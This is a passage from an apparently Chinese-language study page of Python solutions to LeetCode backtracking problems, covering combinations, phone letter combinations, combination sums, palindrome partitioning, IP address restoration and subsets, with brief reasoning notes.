keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">backtracking</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>sindex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">></span> n<span class="token punctuation">:</span> <span class="token comment">#优化1:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> k <span class="token keyword">and</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">==</span>n<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sindex<span class="token punctuation">,</span><span class="token number">9</span><span class="token operator">-</span><span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#优化2</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回溯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="17-电话号码的字母组合"><a class="markdownIt-Anchor" href="#17-电话号码的字母组合"></a> <a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></h3><p>给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p><h4 id="思路-3"><a class="markdownIt-Anchor" href="#思路-3"></a> 思路</h4><p>首先把该问题抽象为一个树:假如给出数字234</p><p>index0:  a  b c</p><p>index1:def  def  def</p><p>index2:ghighighi ghighighi    ghighighi</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>letterMap<span class="token operator">=</span><span class="token punctuation">[</span>            <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment">#0</span>            <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment">#1</span>            <span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token comment">#2</span>            <span class="token string">'def'</span><span class="token punctuation">,</span><span class="token comment">#3</span>            <span class="token string">'ghi'</span><span class="token punctuation">,</span><span class="token comment">#4</span>            <span class="token string">'jkl'</span><span class="token punctuation">,</span><span class="token comment">#5</span>            <span class="token string">'mno'</span><span class="token punctuation">,</span><span class="token comment">#6</span>            <span class="token string">'pqrs'</span><span class="token punctuation">,</span><span class="token comment">#7</span>            <span class="token string">'tuv'</span><span class="token punctuation">,</span><span class="token comment">#8</span>            <span class="token string">'wxyz'</span><span class="token comment">#9</span>        <span class="token punctuation">]</span>        self<span class="token punctuation">.</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>s<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>digits<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>s<span class="token punctuation">)</span>            <span class="token keyword">return</span>        digit<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>digits<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        letters<span class="token operator">=</span>self<span class="token punctuation">.</span>letterMap<span class="token punctuation">[</span>digit<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>letters<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>s<span class="token operator">+=</span>letters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token comment">#存储这一层的值，并进入下一层树</span>            self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>digits<span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>s<span class="token operator">=</span>self<span class="token punctuation">.</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#回溯到上一步</span>    <span class="token keyword">def</span> <span class="token function">letterCombinations</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> digits<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>result        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>digits<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="39-组合总和"><a class="markdownIt-Anchor" href="#39-组合总和"></a> <a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h3><p>给你一个 <strong>无重复元素</strong> 的整数数组 <code>candidates</code> 和一个目标整数 <code>target</code> ，找出 <code>candidates</code> 中可以使数字和为目标数 <code>target</code> 的 所有 <strong>不同组合</strong> ，并以列表形式返回。你可以按 <strong>任意顺序</strong> 返回这些组合。</p><p><code>candidates</code> 中的 <strong>同一个</strong> 数字可以 <strong>无限制重复被选取</strong> 。如果至少一个数字的被选数量不同，则两种组合是不同的。</p><p>对于给定的输入，保证和为 <code>target</code> 的不同组合数少于 <code>150</code> 个。</p><h4 id="思路-4"><a class="markdownIt-Anchor" href="#思路-4"></a> 思路</h4><ul><li><p>本题和<a href="https://programmercarl.com/0077.%E7%BB%84%E5%90%88.html">77.组合 (opens new window)</a>，<a href="https://programmercarl.com/0216.%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CIII.html">216.组合总和III (opens new window)</a>的区别是：本题没有数量要求，可以无限重复，但是有总和的限制，所以间接的也是有个数的限制。</p></li><li><p>本题搜索的过程抽象成树形结构：</p><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20201223170809182.png" alt="39.组合总和1" / loading="lazy"></p></li></ul><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> candidates<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>sIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> total <span class="token operator">></span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> total <span class="token operator">==</span> target<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sIndex<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            total<span class="token operator">+=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>i<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token comment">#可以重复选取，sindex取i</span>            total<span class="token operator">-=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment">#进行回溯操作</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="40-组合总和-ii"><a class="markdownIt-Anchor" href="#40-组合总和-ii"></a> <a href="https://leetcode.cn/problems/combination-sum-ii/">40. 组合总和 II</a></h3><p>给定一个候选人编号的集合 <code>candidates</code> 和一个目标数 <code>target</code> ，找出 <code>candidates</code> 中所有可以使数字和为 <code>target</code> 的组合。</p><p><code>candidates</code> 中的每个数字在每个组合中只能使用 <strong>一次</strong> 。</p><p>**注意：**解集不能包含重复的组合。</p><h4 id="思路-5"><a class="markdownIt-Anchor" href="#思路-5"></a> 思路</h4><p>其实就是上题的改编版，区别在于元素不能重复,但是想了好久还是不明白怎么进行树层的去重</p><p><a href="https://leetcode.cn/problems/combination-sum-ii/solutions/14753/hui-su-suan-fa-jian-zhi-python-dai-ma-java-dai-m-3/">组合总和II解析</a></p><p>实际上可以类比三数之和，先排序，利用双指针，遇到与前一项相等的数值就直接退出进行下一次遍历</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> candidates<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">0</span> <span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        candidates<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dfs2<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">dfs2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>sIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> total <span class="token operator">></span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> total <span class="token operator">==</span> target<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sIndex<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">></span> sIndex <span class="token keyword">and</span> candidates<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#</span>                <span class="token keyword">continue</span>            total<span class="token operator">+=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>dfs2<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token comment">#不可以重复选取，sindex取i+1</span>            total<span class="token operator">-=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment">#进行回溯操作</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分割问题"><a class="markdownIt-Anchor" href="#分割问题"></a> 分割问题</h2><h3 id="131-分割回文串"><a class="markdownIt-Anchor" href="#131-分割回文串"></a> <a href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a></h3><p>给你一个字符串 <code>s</code>，请你将 <code>s</code> 分割成一些子串，使每个子串都是 <strong>回文串</strong> 。返回 <code>s</code> 所有可能的分割方案。</p><p><strong>回文串</strong> 是正着读和反着读都一样的字符串。</p><h4 id="思路-6"><a class="markdownIt-Anchor" href="#思路-6"></a> 思路</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">partition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>start<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span>n<span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">if</span> i<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>            temp<span class="token operator">=</span>s<span class="token punctuation">[</span>start<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> temp<span class="token operator">==</span>temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment">#判断回文</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#遍历下一个字符串</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#回溯</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="93-复原-ip-地址"><a class="markdownIt-Anchor" href="#93-复原-ip-地址"></a> <a href="https://leetcode.cn/problems/restore-ip-addresses/">93. 复原 IP 地址</a></h3><p><strong>有效 IP 地址</strong> 正好由四个整数（每个整数位于 <code>0</code> 到 <code>255</code> 之间组成，且不能含有前导 <code>0</code>），整数之间用 <code>'.'</code> 分隔。</p><ul><li>例如：<code>&quot;0.1.2.201&quot;</code> 和<code> &quot;192.168.1.1&quot;</code> 是 <strong>有效</strong> IP 地址，但是 <code>&quot;0.011.255.245&quot;</code>、<code>&quot;192.168.1.312&quot;</code> 和 <code>&quot;192.168@1.1&quot;</code> 是 <strong>无效</strong> IP 地址。</li></ul><p>给定一个只包含数字的字符串 <code>s</code> ，用以表示一个 IP 地址，返回所有可能的<strong>有效 IP 地址</strong>，这些地址可以通过在 <code>s</code> 中插入 <code>'.'</code> 来形成。你 <strong>不能</strong> 重新排序或删除 <code>s</code> 中的任何数字。你可以按 <strong>任何</strong> 顺序返回答案。</p><h4 id="思路-7"><a class="markdownIt-Anchor" href="#思路-7"></a> 思路</h4><p>实际上相当于给字符串中加上四个逗号</p><p>写回溯算法的关键还是要思路清晰，逻辑正确那么结果就一定正确</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">restoreIpAddresses</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token comment">#假设插入4个逗号</span>        <span class="token comment">#index代表开始插入的下标</span>        <span class="token comment">#dots代表已经插入的逗号数</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">12</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">backTrack</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>dots<span class="token punctuation">,</span>curIP<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dots <span class="token operator">==</span><span class="token number">4</span> <span class="token keyword">and</span> index <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curIP<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">if</span> dots <span class="token operator">></span><span class="token number">4</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">min</span><span class="token punctuation">(</span>index<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">255</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> i<span class="token operator">==</span>index <span class="token punctuation">)</span> <span class="token punctuation">:</span>                    backTrack<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>dots<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>curIP<span class="token operator">+</span>s<span class="token punctuation">[</span>index<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.'</span><span class="token punctuation">)</span>        backTrack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子集问题"><a class="markdownIt-Anchor" href="#子集问题"></a> 子集问题</h2><h3 id="78-子集"><a class="markdownIt-Anchor" href="#78-子集"></a> <a href="https://leetcode.cn/problems/subsets/">78. 子集</a></h3><p>给你一个整数数组 <code>nums</code> ，数组中的元素 <strong>互不相同</strong> 。返回该数组所有可能的子集（幂集）。</p><p>解集 <strong>不能</strong> 包含重复的子集。你可以按 <strong>任意顺序</strong> 返回解集</p><h4 id="思路-8"><a class="markdownIt-Anchor" href="#思路-8"></a> 思路</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">subsets</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="90-子集-ii"><a class="markdownIt-Anchor" href="#90-子集-ii"></a> <a href="https://leetcode.cn/problems/subsets-ii/">90. 子集 II</a></h3><p>给你一个整数数组 <code>nums</code> ，其中可能包含重复元素，请你返回该数组所有可能的子集</p><p>解集 <strong>不能</strong> 包含重复的子集。返回的解集中，子集可以按 <strong>任意顺序</strong> 排列。</p><h4 id="思路-9"><a class="markdownIt-Anchor" href="#思路-9"></a> 思路</h4><p>这道题目和<a href="https://programmercarl.com/0078.%E5%AD%90%E9%9B%86.html">78.子集 </a>区别就是集合里有重复元素了，而且求取的子集要去重。</p><p>**去重的关键:**一树层上重复取2 就要过滤掉，同一树枝上就可以重复取2，因为同一树枝上元素的集合才是唯一子集！</p><p>（<strong>注意去重需要先对集合排序</strong>）去重的思路与<a href="https://programmercarl.com/0040.%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CII.html">回溯算法：求组合总和（三）</a>大体相同</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">subsetsWithDup</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> i <span class="token operator">></span> index<span class="token punctuation">:</span> <span class="token comment">#树层去重</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token 